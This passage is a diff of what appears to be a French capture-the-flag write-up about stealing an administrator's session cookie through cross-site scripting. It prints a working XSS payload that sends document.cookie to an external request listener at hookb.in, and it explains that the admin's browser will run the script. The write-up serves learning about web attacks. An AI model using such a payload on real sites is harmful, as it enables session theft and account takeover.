@@ -17,7 +17,7 @@ Pour accèder à la page secrète, il va sûrement falloir voler le cookie de l'
 Comme les scripts sont éxécutés par l'admin, si on écrit un payload pour renvoyer le cookie de la page, celui qui va être renvoyé le sien.
 
 Payload : <br/>
-`<script>document.write('<img src="https://hookb.in/9X1qnEMbdnI600eMoWM7?cookie='+document.cookie+'">I'm a cookie stealer :p</img>');</script>`
+`<script>document.write('<img src="https://hookb.in/9X1qnEMbdnI600eMoWM7?cookie='+document.cookie+'">Im a cookie stealer :p</img>');</script>`
 
 Ce script permet de dermander à l'administrateur de renvoyer le cookie à l'adresse `https://hookb.in/9X1qnEMbdnI600eMoWM7` qui est un écouteur de requêtes.
 
